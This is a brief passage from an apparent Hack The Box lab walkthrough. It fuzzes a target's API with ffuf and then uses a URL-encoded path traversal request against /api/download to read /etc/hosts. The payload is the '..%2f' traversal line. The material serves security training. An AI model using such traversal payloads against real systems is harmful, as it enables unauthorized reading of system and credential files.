...
```shell-session
Pangulin@htb[/htb]$ curl http://<TARGET IP>:3000/api
{"status":"UP"}
```
...
```shell-session
Pangulin@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
...
```shell-session
Pangulin@htb[/htb]$ curl http://<TARGET IP>:3000/api/download
...
```shell-session
Pangulin@htb[/htb]$ curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
127.0.0.1 localhost
